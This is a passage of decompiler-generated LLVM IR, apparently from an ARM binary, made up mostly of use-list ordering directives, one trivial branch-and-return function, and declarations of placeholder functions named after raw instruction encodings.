  uselistorder i32 0, { 0, 1262, 96, 1263, 1264, 241, 240, 576, 84, 85, 86, 87, 578, 577, 62, 61, 97, 1265, 1266, 1267, 1268, 1270, 1269, 1, 1271, 1272, 243, 242, 579, 88, 89, 90, 91, 581, 580, 64, 63, 60, 72, 1273, 582, 2, 1274, 1275, 92, 1276, 1277, 1278, 1279, 1280, 126, 583, 586, 584, 585, 1281, 587, 106, 127, 954, 955, 93, 956, 957, 958, 3, 606, 244, 5, 4, 128, 959, 129, 607, 6, 245, 130, 131, 295, 65, 132, 304, 880, 82, 704, 705, 961, 960, 962, 963, 34, 133, 964, 136, 135, 134, 296, 297, 298, 138, 137, 139, 305, 965, 966, 140, 939, 940, 107, 141, 967, 142, 629, 143, 968, 969, 144, 970, 971, 632, 881, 98, 882, 883, 633, 634, 630, 608, 312, 631, 653, 654, 635, 636, 145, 146, 637, 638, 639, 640, 609, 310, 641, 642, 610, 311, 643, 644, 611, 309, 645, 646, 612, 308, 647, 648, 613, 307, 649, 656, 614, 306, 650, 655, 651, 79, 66, 108, 109, 652, 588, 884, 313, 885, 247, 886, 314, 887, 890, 891, 148, 246, 888, 889, 315, 316, 892, 317, 893, 261, 894, 895, 615, 75, 318, 897, 898, 899, 900, 901, 902, 903, 258, 257, 904, 319, 905, 94, 906, 110, 907, 605, 908, 909, 910, 604, 911, 912, 913, 147, 320, 321, 914, 917, 918, 919, 920, 921, 149, 915, 150, 916, 7, 151, 896, 672, 673, 674, 81, 67, 675, 80, 68, 676, 677, 678, 679, 680, 322, 681, 323, 682, 683, 685, 152, 684, 76, 686, 9, 8, 687, 721, 722, 725, 726, 723, 724, 727, 728, 324, 657, 325, 659, 153, 660, 661, 662, 663, 664, 665, 666, 667, 155, 154, 77, 326, 668, 658, 10, 669, 670, 156, 671, 327, 688, 689, 690, 328, 329, 299, 160, 159, 616, 300, 162, 161, 617, 301, 164, 163, 618, 302, 166, 165, 619, 620, 303, 158, 157, 249, 256, 250, 251, 252, 330, 691, 167, 168, 700, 692, 693, 694, 695, 696, 697, 698, 699, 331, 248, 701, 702, 69, 703, 332, 169, 170, 333, 83, 706, 707, 708, 709, 255, 710, 711, 712, 254, 713, 714, 715, 716, 101, 717, 719, 718, 99, 100, 171, 253, 334, 720, 262, 263, 264, 102, 172, 73, 173, 729, 114, 113, 111, 112, 730, 731, 74, 732, 733, 734, 735, 736, 174, 737, 738, 335, 739, 740, 741, 742, 178, 175, 176, 177, 743, 744, 745, 746, 336, 747, 748, 267, 749, 266, 750, 265, 751, 337, 752, 753, 754, 117, 115, 116, 11, 755, 756, 757, 758, 179, 759, 760, 269, 268, 761, 338, 762, 763, 764, 765, 766, 121, 118, 119, 120, 12, 767, 768, 769, 180, 770, 181, 771, 772, 272, 773, 271, 774, 270, 775, 339, 776, 186, 341, 184, 185, 182, 183, 777, 188, 187, 342, 189, 340, 194, 344, 192, 193, 190, 191, 778, 196, 195, 197, 343, 780, 781, 125, 122, 123, 124, 13, 779, 782, 783, 784, 785, 786, 787, 14, 15, 16, 17, 18, 788, 789, 345, 274, 790, 346, 791, 347, 792, 348, 793, 349, 794, 350, 795, 351, 796, 273, 797, 198, 199, 200, 799, 800, 798, 802, 803, 801, 19, 20, 21, 22, 23, 804, 201, 805, 806, 276, 807, 352, 808, 353, 809, 354, 810, 355, 811, 356, 812, 357, 813, 275, 814, 358, 815, 203, 202, 204, 817, 818, 816, 819, 820, 70, 822, 823, 205, 279, 824, 359, 825, 360, 826, 24, 25, 26, 27, 28, 821, 206, 103, 827, 828, 278, 829, 277, 830, 361, 831, 208, 207, 209, 833, 834, 832, 835, 836, 71, 838, 839, 210, 285, 840, 362, 841, 363, 842, 29, 30, 31, 32, 33, 837, 211, 104, 843, 844, 284, 845, 283, 846, 282, 847, 281, 848, 280, 849, 364, 850, 365, 851, 212, 215, 214, 213, 854, 855, 853, 852, 366, 857, 856, 858, 216, 859, 860, 288, 861, 287, 862, 286, 863, 367, 864, 217, 220, 219, 218, 867, 868, 866, 865, 368, 870, 869, 871, 872, 221, 291, 873, 290, 874, 289, 875, 369, 876, 259, 877, 972, 222, 973, 878, 223, 879, 922, 923, 924, 925, 926, 927, 224, 928, 929, 930, 931, 932, 933, 934, 935, 225, 226, 936, 937, 938, 941, 227, 942, 943, 944, 228, 370, 945, 946, 35, 947, 948, 949, 950, 951, 371, 952, 229, 974, 975, 976, 953, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 373, 990, 589, 590, 591, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 372, 1026, 1027, 1028, 1029, 1030, 1031, 36, 1032, 1033, 1034, 230, 231, 1035, 374, 1036, 1037, 1038, 1039, 592, 621, 1040, 1041, 1042, 37, 1043, 1044, 1045, 1046, 38, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 39, 1054, 1055, 236, 1056, 1057, 1058, 1059, 1060, 1061, 40, 1062, 1063, 1064, 41, 1065, 1066, 1067, 42, 1068, 1069, 1070, 1071, 377, 1085, 1086, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 593, 622, 1081, 1082, 1083, 1084, 594, 623, 1087, 1088, 1089, 43, 1090, 1091, 378, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 595, 624, 1100, 1101, 1102, 44, 1103, 1104, 1105, 1106, 45, 1107, 596, 1108, 1109, 1112, 1113, 597, 232, 1110, 1111, 233, 234, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 598, 625, 1125, 1126, 1127, 46, 1128, 1129, 1130, 1131, 1132, 1133, 47, 1134, 105, 1135, 1136, 1137, 1138, 599, 626, 1139, 1140, 1141, 48, 1142, 235, 1143, 1144, 1145, 49, 1146, 1147, 1148, 1149, 1150, 600, 627, 1151, 1152, 1153, 50, 1154, 1155, 1156, 51, 375, 376, 1157, 1158, 1159, 1160, 1161, 601, 628, 1162, 1163, 1164, 52, 1165, 1166, 1167, 53, 1168, 1169, 1170, 54, 1171, 1172, 1173, 55, 1174, 1175, 1176, 1177, 56, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1190, 1191, 602, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 260, 1203, 1206, 1207, 1210, 1211, 1212, 57, 1208, 1209, 1204, 1205, 1213, 1214, 238, 237, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 58, 239, 1225, 1226, 1227, 59, 1228, 1229, 1230, 1231, 1233, 78, 379, 380, 1234, 1232, 1188, 1189, 95, 1235, 603, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 292, 1256, 293, 1257, 294, 1258, 1261, 1259, 1260, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294 }
  uselistorder i32* @r4, { 31, 521, 426, 427, 100, 101, 32, 428, 429, 430, 431, 432, 433, 33, 34, 379, 380, 35, 381, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 382, 383, 384, 385, 386, 387, 390, 391, 392, 393, 394, 395, 396, 399, 0, 400, 388, 389, 63, 64, 65, 66, 67, 357, 358, 359, 360, 116, 117, 397, 398, 47, 48, 49, 50, 51, 2, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 68, 69, 70, 71, 72, 73, 74, 3, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 24, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 102, 103, 104, 1, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 4, 164, 5, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 6, 195, 7, 196, 8, 197, 9, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 10, 218, 11, 219, 12, 220, 13, 221, 222, 223, 14, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 15, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 16, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 17, 342, 18, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 361, 19, 362, 20, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 434, 435, 436, 401, 402, 403, 404, 405, 406, 21, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 419, 417, 418, 420, 421, 422, 423, 424, 425, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 25, 464, 465, 30, 466, 23, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 29, 22, 478, 479, 480, 481, 482, 483, 484, 28, 485, 486, 487, 27, 488, 489, 490, 26, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 522 }
}

define i32 @__data_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1d8fc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1d8fc, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder i1 false, { 0, 2, 39, 3, 38, 1, 11, 13, 4, 5, 6, 37, 68, 69, 70, 10, 7, 8, 9, 34, 64, 71, 42, 72, 73, 43, 74, 18, 19, 20, 21, 44, 75, 76, 60, 77, 78, 79, 49, 80, 23, 24, 50, 81, 51, 82, 45, 46, 47, 22, 83, 48, 84, 85, 59, 86, 87, 88, 89, 90, 91, 52, 53, 92, 93, 54, 94, 55, 56, 95, 57, 96, 58, 97, 40, 41, 98, 99, 100, 101, 102, 103, 25, 26, 61, 104, 105, 62, 32, 106, 63, 15, 16, 27, 17, 28, 29, 30, 12, 31, 107, 33, 35, 65, 66, 108, 14, 67, 109, 36, 110 }
  uselistorder i1* @cpsr_z, { 8, 4, 5, 0, 1, 2, 3, 6, 7 }
  uselistorder label %bb1, { 1, 0 }
}

declare i32 @unknown_e59dc01c() local_unnamed_addr

declare i32 @unknown_e59de01c() local_unnamed_addr

declare i32 @unknown_e59f12c4() local_unnamed_addr

declare i32 @unknown_e08e0000() local_unnamed_addr

declare i32 @unknown_eb002b7a() local_unnamed_addr

declare i32 @unknown_e59d103c() local_unnamed_addr

declare i32 @unknown_e1510005() local_unnamed_addr

declare i32 @unknown_a000033() local_unnamed_addr

declare i32 @unknown_e3a00023() local_unnamed_addr

declare i32 @unknown_eb002922() local_unnamed_addr

declare i32 @unknown_e59d001c() local_unnamed_addr

declare i32 @unknown_eb002b69() local_unnamed_addr

declare i32 @unknown_e1a01005() local_unnamed_addr

declare i32 @unknown_e1a04000() local_unnamed_addr

declare i32 @unknown_eb0028e3() local_unnamed_addr

declare i32 @unknown_e59d201c() local_unnamed_addr

declare i32 @unknown_e1a01000() local_unnamed_addr

declare i32 @unknown_e0820004() local_unnamed_addr

declare i32 @unknown_eb002b6b() local_unnamed_addr

declare i32 @unknown_eb0028e8() local_unnamed_addr

declare i32 @unknown_eb002b5d() local_unnamed_addr

declare i32 @unknown_e59d301c() local_unnamed_addr

declare i32 @unknown_e59f1268() local_unnamed_addr

declare i32 @unknown_e0830000() local_unnamed_addr

declare i32 @unknown_eb002b63() local_unnamed_addr

declare i32 @unknown_eb002b57() local_unnamed_addr

declare i32 @unknown_e3a00028() local_unnamed_addr

declare i32 @unknown_eb0028d1() local_unnamed_addr

declare i32 @unknown_e08c0004() local_unnamed_addr

declare i32 @unknown_eb002b59() local_unnamed_addr

declare i32 @unknown_eb002b4d() local_unnamed_addr

declare i32 @unknown_e59f1210() local_unnamed_addr

declare i32 @unknown_eb002b53() local_unnamed_addr

declare i32 @unknown_e59d003c() local_unnamed_addr

declare i32 @unknown_eb002b47() local_unnamed_addr

declare i32 @unknown_eb002b44() local_unnamed_addr

declare i32 @unknown_e59d101c() local_unnamed_addr

declare i32 @unknown_e0812000() local_unnamed_addr

declare i32 @unknown_e3a0100a() local_unnamed_addr

declare i32 @unknown_e1a00004() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

attributes #0 = { nounwind readnone }
